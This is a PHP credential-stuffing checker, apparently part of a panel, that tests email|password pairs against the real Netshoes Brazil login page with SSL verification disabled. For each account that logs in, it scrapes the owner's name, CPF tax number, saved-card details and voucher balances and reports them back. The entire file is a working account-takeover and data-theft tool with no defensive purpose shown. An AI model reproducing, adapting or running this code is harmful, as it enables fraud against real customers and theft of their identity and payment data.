<?php
include('../../../../arquivos/php/verifica_login.php');
error_reporting(0);
set_time_limit(0);
DeletarCookies();
extract($_REQUEST);

function deletarCookies() {
    if (file_exists("netshoes.txt")) {
        unlink("netshoes.txt");
    }
}

$lista = str_replace(" ", "", $linha);
$separa = explode("|", $lista);
$email = $separa[0];
$senha = $separa[1];

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/login"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/netshoes.txt'); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/netshoes.txt'); 
curl_setopt($ch, CURLOPT_POST, 0); 
$data = curl_exec($ch); 

$token = explode('"', explode('id="clipping" type="hidden" value="', $data)[1])[0]; 

curl_setopt($ch, CURLOPT_URL, 'https://www.netshoes.com.br/login'); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$email.'&password='.$senha.'&recaptchaResponse=&clipping='.$token.''); 
$data = curl_exec($ch);

if (!strpos($data, "Meus Pedidos")) { 
	echo json_encode(array('status' => 0,'str' => '<tr><td>'.$email.'</td><td>'.$senha.'</td></tr>'));
} else { 

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-orders"); 
curl_setopt($ch, CURLOPT_POST, 0); 
$data = curl_exec($ch); 

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-personal-info"); 
curl_setopt($ch, CURLOPT_POST, 0); $data = curl_exec($ch); 
$name = explode('" placeholder="* Seu nome"', explode('Nome" type="text" id="name" name="person[name]" value="', $data)[1])[0]; 
$sobrenome = explode('" placeholder="* Sobrenome"', explode('title="Sobrenome" type="text" id="last-name" name="person[lastName]" value="', $data)[1])[0]; 
$cpf = explode('" disabled readonly />', explode('id="cpf" data-hj-masked class="ns-mask-cpf" type="text" name="person[cpf]" value="', $data)[1])[0]; 

curl_setopt($ch, 
CURLOPT_URL, "https://www.netshoes.com.br/account/my-cards"); 
curl_setopt($ch, CURLOPT_POST, 0);
$data = curl_exec($ch); 

if (strpos($data, "Você não possui cartões salvos.")) { 
	$cards = "neClick: <span class='label label-danger'>Não</span>"; 

}else if (strpos($data, "") !== false){ 
	$cards = ""; 

}else if (strpos($data, "Excluir") !== false){ 
	$cards = "OneClick: ";

}else { $cards = "";

} 

$card = explode('</div>', explode('<div class="card-list__info-card">', $data)[1])[0]; 
curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-cards"); 
curl_setopt($ch, CURLOPT_POST, 0); 
$data = curl_exec($ch); 

if (strpos($data, "Você não possui cartões salvos.")) { 
	$datacard = ""; 

} else if (strpos($data, "") !== false){ 
	$datacard = ""; 

} else if (strpos($data, "Validade") !== false){ 
	$datacard = " | Data Vale: ";

} else { $datacard = ""; 

} 

$cardviado = explode('</div>', explode('<div class="card-list__info-date">', $data)[1])[0];
curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-vouchers"); 
curl_setopt($ch, CURLOPT_POST, 0); $data2 = curl_exec($ch); 

if (strpos($data2, "Você não possui vales-compra.")) { 
	$vale = "Não"; 

} else if (strpos($data2, "Aguardando ativação") !== false){ 
	$vale = "Aguardando ativação [Saldo]"; 

} else if (strpos($data2, "Ativo") !== false){ 
	$vale = "Ativo [Saldo] ";

} else { 
	$vale = "Não"; 
} 

$saldos = explode('</i>', explode('</i></td><td class="cell green-text"><i>', $data2)[1])[0]; 
$saldo = explode('</i></td><td class="cell">', explode('<td class="cell red-text"><i>R$ 104,90</i></td><td class="cell green-text"><i>', $data2)[1])[0]; 

if (strpos($data2, "Você não possui vales-compra.")) {
$validade = ""; 

} else if (strpos($data2, "Aguardando ativação") !== false){ $validade = ""; 

} else if (strpos($data2, "Ativo") !== false){ 
$validade = " [Data Vale]"; 

} else { $validade = ""; 

} 

$validad = explode('</td><td class="cell">', explode('</i></td><td class="cell">', $data2)[1])[0]; 

	echo json_encode(array('status' => 1,'str' => '<tr><td>'.$email.'</td><td>'.$senha.'</td><td>'.$name.' '.$sobrenome.'<td>'.$cpf.'</td><td>'.$vale.'</td></tr>'));

	}

?>
